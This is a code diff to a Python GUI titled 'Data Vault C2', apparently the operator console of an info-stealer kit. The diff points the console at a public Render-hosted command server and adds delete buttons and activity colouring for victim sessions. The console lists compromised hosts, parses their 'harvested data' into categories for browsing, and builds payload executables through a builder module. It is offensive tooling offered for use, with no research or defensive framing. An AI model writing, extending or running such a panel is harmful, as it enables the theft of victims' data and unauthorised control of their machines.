@@ -3,18 +3,17 @@ from tkinter import filedialog, messagebox
 import requests
 import threading
 import time
-import re # Import the regular expression module
+import re
 from builder import build_payload
 
-# --- CONFIGURATION ---
-# IMPORTANT: Use your public Render URL here once deployed!
-C2_SERVER_URL = "http://127.0.0.1:5002"
+# IMPORTANT: Use your public Render URL here!
+C2_SERVER_URL = "https://datavault-c2.onrender.com" # Example URL
 
 class App(ctk.CTk):
     def __init__(self):
         super().__init__()
         self.title("Data Vault C2")
-        self.geometry("1200x700") # Increased size for new layout
+        self.geometry("1200x700")
 
         self.grid_columnconfigure(1, weight=1)
         self.grid_rowconfigure(0, weight=1)
@@ -22,18 +21,15 @@ class App(ctk.CTk):
         # --- DATA STORAGE ---
         self.sessions = {}
         self.session_widgets = {}
-        # New variables for the detail view
         self.detail_view_data_map = {}
         self.detail_view_tab_buttons = {}
         self.detail_view_content_textbox = None
         
         # --- WIDGETS ---
-        # Left frame for builder and sessions list
         self.left_frame = ctk.CTkFrame(self, width=300, corner_radius=0)
         self.left_frame.grid(row=0, column=0, rowspan=2, sticky="nsew")
         self.left_frame.grid_rowconfigure(3, weight=1)
 
-        # Right frame for displaying data in a tabbed view
         self.right_frame = ctk.CTkFrame(self, corner_radius=0)
         self.right_frame.grid(row=0, column=1, sticky="nsew", padx=(5,0))
         self.right_frame.grid_rowconfigure(1, weight=1)
@@ -42,12 +38,11 @@ class App(ctk.CTk):
         self.setup_left_frame()
         self.setup_right_frame()
         
-        # --- POLLING ---
         self.polling_active = False
         self.start_polling()
 
     def setup_left_frame(self):
-        # This function remains largely the same as before
+        # Builder Section
         builder_frame = ctk.CTkFrame(self.left_frame, fg_color="transparent")
         builder_frame.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
         ctk.CTkLabel(builder_frame, text="Payload Builder", font=ctk.CTkFont(weight="bold")).pack()
@@ -67,118 +62,70 @@ class App(ctk.CTk):
         self.sessions_frame.grid(row=3, column=0, sticky="nsew", padx=10, pady=(0, 10))
 
     def setup_right_frame(self):
-        """Redesigned to support a tabbed/detailed view."""
         self.hostname_label = ctk.CTkLabel(self.right_frame, text="Select a session to view data", font=ctk.CTkFont(size=16, weight="bold"))
         self.hostname_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
         
-        # This frame will hold the data categories and the content
         self.data_container = ctk.CTkFrame(self.right_frame, fg_color="transparent")
         self.data_container.grid(row=1, column=0, sticky="nsew", padx=10, pady=(0, 10))
-        self.data_container.grid_columnconfigure(1, weight=1)
-        self.data_container.grid_rowconfigure(0, weight=1)
+        self.data_container.grid_columnconfigure(1, weight=1); self.data_container.grid_rowconfigure(0, weight=1)
 
-        # Panel on the left for category buttons (our "tabs")
         self.tab_panel = ctk.CTkScrollableFrame(self.data_container, width=200, corner_radius=0)
         self.tab_panel.grid(row=0, column=0, sticky="nsw", padx=(0, 5))
-        ctk.CTkLabel(self.tab_panel, text="Data Categories").pack(pady=5) # Initial placeholder
+        ctk.CTkLabel(self.tab_panel, text="Data Categories").pack(pady=5)
 
-        # Panel on the right for displaying content
         content_panel = ctk.CTkFrame(self.data_container, corner_radius=0, fg_color="transparent")
         content_panel.grid(row=0, column=1, sticky="nsew")
-        content_panel.grid_rowconfigure(0, weight=1)
-        content_panel.grid_columnconfigure(0, weight=1)
+        content_panel.grid_rowconfigure(0, weight=1); content_panel.grid_columnconfigure(0, weight=1)
         
         self.detail_view_content_textbox = ctk.CTkTextbox(content_panel, wrap="word", corner_radius=0)
         self.detail_view_content_textbox.grid(row=0, column=0, sticky="nsew")
-        self.detail_view_content_textbox.insert("0.0", "Harvested data will be displayed here...")
-        self.detail_view_content_textbox.configure(state="disabled")
+        self.detail_view_content_textbox.insert("0.0", "Harvested data will be displayed here..."); self.detail_view_content_textbox.configure(state="disabled")
 
-    def display_session_data(self, session_id):
-        """
-        Overhauled to parse the data string and create the tabbed view.
-        """
-        session = self.sessions.get(session_id)
-        if not session: return
-
-        self.hostname_label.configure(text=f"Host: {session.get('hostname', 'N/A')}")
+    def add_session_widget(self, session_data):
+        """THIS IS THE KEY CHANGE: It now creates a frame with two buttons."""
+        sid = session_data["session_id"]
+        hostname = session_data["hostname"]
         
-        # Clear previous session's data and buttons
-        for widget in self.tab_panel.winfo_children():
-            widget.destroy()
-        self.detail_view_tab_buttons = {}
-        
-        # The magic: Use regex to parse the data harvested by the payload
-        harvested_text = session.get("data", "No data available.")
-        # This pattern looks for "--- Title ---\n\nContent..."
-        pattern = re.compile(r"--- (.*?) ---\n\n(.*?)(?=\n\n---|\Z)", re.DOTALL)
-        matches = pattern.findall(harvested_text)
-        
-        self.detail_view_data_map = {title.strip(): content.strip() for title, content in matches}
-        
-        if not self.detail_view_data_map:
-             # Handle case where data is not formatted correctly or is empty
-            self.update_content_view("Info", fallback_text="No parsable data found for this session.")
-            return
-            
-        # Create a button for each data category
-        for title in self.detail_view_data_map.keys():
-            button = ctk.CTkButton(
-                self.tab_panel,
-                text=title,
-                anchor="w",
-                fg_color="transparent", # Make it look like a tab, not a button
-                command=lambda t=title: self.update_content_view(t)
-            )
-            button.pack(fill="x", padx=5, pady=2)
-            self.detail_view_tab_buttons[title] = button
-            
-        # Automatically select and display the first category
-        if self.detail_view_data_map.keys():
-            first_tab_title = list(self.detail_view_data_map.keys())[0]
-            self.update_content_view(first_tab_title)
+        # Create a container frame to hold both buttons
+        container_frame = ctk.CTkFrame(self.sessions_frame, fg_color="transparent")
+        container_frame.pack(fill="x", padx=5, pady=2)
+        container_frame.grid_columnconfigure(0, weight=1)
 
-    def update_content_view(self, selected_title, fallback_text=None):
-        """Updates the content textbox and highlights the active 'tab' button."""
-        if fallback_text:
-            content = fallback_text
-        else:
-            content = self.detail_view_data_map.get(selected_title, "Content not found.")
+        # The main button to view session data
+        session_button = ctk.CTkButton(
+            container_frame, text=f"  {hostname}", anchor="w",
+            command=lambda s=sid: self.display_session_data(s))
+        session_button.grid(row=0, column=0, sticky="ew", padx=(0, 5))
 
-        # Update the textbox content
-        self.detail_view_content_textbox.configure(state="normal")
-        self.detail_view_content_textbox.delete("0.0", "end")
-        self.detail_view_content_textbox.insert("0.0", content)
-        self.detail_view_content_textbox.configure(state="disabled")
-        
-        # Update button appearances to show which one is active
-        for title, button in self.detail_view_tab_buttons.items():
-            if title == selected_title:
-                button.configure(fg_color="gray20") # Highlight color
-            else:
-                button.configure(fg_color="transparent")
+        # The new delete button
+        delete_button = ctk.CTkButton(
+            container_frame, text="X", width=30, fg_color="firebrick", hover_color="darkred",
+            command=lambda s=sid: self.delete_session_handler(s))
+        delete_button.grid(row=0, column=1, sticky="e")
 
-    # ----- UNCHANGED METHODS FROM PREVIOUS VERSION -----
-    
-    def start_polling(self):
-        if not self.polling_active:
-            self.polling_active = True
-            self.poll_thread = threading.Thread(target=self.poll_for_sessions, daemon=True)
-            self.poll_thread.start()
-            self.protocol("WM_DELETE_WINDOW", self.on_closing)
+        # Store references to the widgets for later updates/deletion
+        self.session_widgets[sid] = {"frame": container_frame, "button": session_button}
 
-    def on_closing(self):
-        self.polling_active = False
-        self.destroy()
-
-    def poll_for_sessions(self):
-        while self.polling_active:
+    def delete_session_handler(self, session_id):
+        """This function handles the delete button click event."""
+        hostname = self.sessions.get(session_id, {}).get("hostname", session_id[:8])
+        if messagebox.askyesno("Confirm Deletion", f"Are you sure you want to permanently delete session '{hostname}'? This cannot be undone."):
             try:
-                response = requests.get(f"{C2_SERVER_URL}/api/get_sessions", timeout=10)
+                # Send the delete request to the server
+                response = requests.post(f"{C2_SERVER_URL}/api/delete_session", json={"session_id": session_id}, timeout=10)
                 response.raise_for_status()
-                self.after(0, self.update_gui_with_sessions, response.json())
-            except requests.exceptions.RequestException:
-                pass
-            time.sleep(5)
+                
+                # If the server confirms deletion, remove it from the GUI instantly
+                if session_id in self.session_widgets:
+                    self.session_widgets[session_id]["frame"].destroy()
+                    del self.session_widgets[session_id]
+                if session_id in self.sessions:
+                    del self.sessions[session_id]
+                
+                self.sessions_label.configure(text=f"Active Sessions ({len(self.sessions)})")
+
+            except requests.exceptions.RequestException as e:
+                messagebox.showerror("Error", f"Failed to send delete command to server: {e}")
 
     def update_gui_with_sessions(self, server_sessions):
         self.sessions_label.configure(text=f"Active Sessions ({len(server_sessions)})")
@@ -189,21 +136,64 @@ class App(ctk.CTk):
             if sid not in self.sessions:
                 self.sessions[sid] = session_data
                 self.add_session_widget(session_data)
+            else:
+                self.sessions[sid] = session_data
+
+            is_active = (time.time() - session_data.get("last_seen", 0)) < 60
+            if sid in self.session_widgets:
+                self.session_widgets[sid]["button"].configure(fg_color="green" if is_active else "orange")
         
         for sid in list(self.sessions.keys()):
             if sid not in server_session_ids:
                 if sid in self.session_widgets:
-                    self.session_widgets[sid].destroy()
+                    self.session_widgets[sid]["frame"].destroy()
                     del self.session_widgets[sid]
                 del self.sessions[sid]
+    
+    # --- Other methods are unchanged ---
 
-    def add_session_widget(self, session_data):
-        sid = session_data["session_id"]
-        hostname = session_data["hostname"]
-        button = ctk.CTkButton(self.sessions_frame, text=f"{hostname}", anchor="w",
-                               command=lambda s=sid: self.display_session_data(s))
-        button.pack(fill="x", padx=5, pady=2)
-        self.session_widgets[sid] = button
+    def display_session_data(self, session_id):
+        session = self.sessions.get(session_id)
+        if not session: return
+        self.hostname_label.configure(text=f"Host: {session.get('hostname', 'N/A')}")
+        for widget in self.tab_panel.winfo_children(): widget.destroy()
+        self.detail_view_tab_buttons.clear()
+        pattern = re.compile(r"--- (.*?) ---\n\n(.*?)(?=\n\n---|\Z)", re.DOTALL)
+        matches = pattern.findall(session.get("data", ""))
+        self.detail_view_data_map = {title.strip(): content.strip() for title, content in matches}
+        if not self.detail_view_data_map:
+            self.update_content_view("Info", "No parsable data found.")
+            return
+        for title in self.detail_view_data_map.keys():
+            button = ctk.CTkButton(self.tab_panel, text=title, anchor="w", fg_color="transparent", command=lambda t=title: self.update_content_view(t))
+            button.pack(fill="x", padx=5, pady=2)
+            self.detail_view_tab_buttons[title] = button
+        if self.detail_view_data_map:
+            self.update_content_view(list(self.detail_view_data_map.keys())[0])
+
+    def update_content_view(self, selected_title, fallback_text=None):
+        content = fallback_text if fallback_text is not None else self.detail_view_data_map.get(selected_title, "Content not found.")
+        self.detail_view_content_textbox.configure(state="normal")
+        self.detail_view_content_textbox.delete("0.0", "end")
+        self.detail_view_content_textbox.insert("0.0", content)
+        self.detail_view_content_textbox.configure(state="disabled")
+        for title, button in self.detail_view_tab_buttons.items():
+            button.configure(fg_color="gray20" if title == selected_title else "transparent")
+
+    def start_polling(self):
+        if not self.polling_active:
+            self.polling_active = True
+            threading.Thread(target=self.poll_for_sessions, daemon=True).start()
+            self.protocol("WM_DELETE_WINDOW", self.on_closing)
+
+    def poll_for_sessions(self):
+        while self.polling_active:
+            try:
+                response = requests.get(f"{C2_SERVER_URL}/api/get_sessions", timeout=10)
+                if response.status_code == 200:
+                    self.after(0, self.update_gui_with_sessions, response.json())
+            except requests.exceptions.RequestException: pass
+            time.sleep(5)
 
     def build_payload_handler(self):
         payload_name = self.payload_name_entry.get()
@@ -212,7 +202,6 @@ class App(ctk.CTk):
             return
         output_dir = filedialog.askdirectory(title="Select Save Directory")
         if not output_dir: return
-            
         self.build_button.configure(state="disabled", text="Building...")
         self.update_idletasks()
         threading.Thread(target=self._run_build, args=(C2_SERVER_URL, output_dir, payload_name), daemon=True).start()
@@ -222,8 +211,15 @@ class App(ctk.CTk):
         self.after(0, self.on_build_complete, success, payload_name)
 
     def on_build_complete(self, success, payload_name):
-        if success:
-            messagebox.showinfo("Success", f"Payload '{payload_name}.exe' built successfully!")
-        else:
-            messagebox.showerror("Build Failed", "Check console for details.")
+        if success: messagebox.showinfo("Success", f"Payload '{payload_name}.exe' built successfully!")
+        else: messagebox.showerror("Build Failed", "Check console for details.")
         self.build_button.configure(state="normal", text="Build Payload")
+
+    def on_closing(self):
+        self.polling_active = False
+        self.destroy()
+
+# This is the main entry point if you run gui.py directly for testing
+if __name__ == "__main__":
+    app = App()
+    app.mainloop()
